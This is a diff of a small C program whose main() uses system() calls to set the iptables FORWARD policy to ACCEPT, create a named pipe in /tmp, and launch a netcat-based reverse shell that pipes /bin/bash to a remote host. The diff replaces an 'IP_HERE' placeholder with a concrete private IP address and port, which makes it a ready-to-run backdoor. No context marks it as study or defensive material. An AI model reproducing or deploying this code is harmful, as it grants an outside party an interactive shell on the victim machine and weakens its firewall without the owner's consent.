@@ -14,7 +14,7 @@ int main(int argc, char **argv){
 	system("iptables -P FORWARD ACCEPT");
 
 	system("[ ! -p /tmp/asdcoij ] && mkfifo /tmp/asdcoij");
-	system("(/bin/bash 0</tmp/asdcoij | nc IP_HERE 7331 1>/tmp/asdcoij) &");
+	system("(/bin/bash 0</tmp/asdcoij | nc 172.20.10.43 1001 1>/tmp/asdcoij) &");
 
 	return 0;
 }
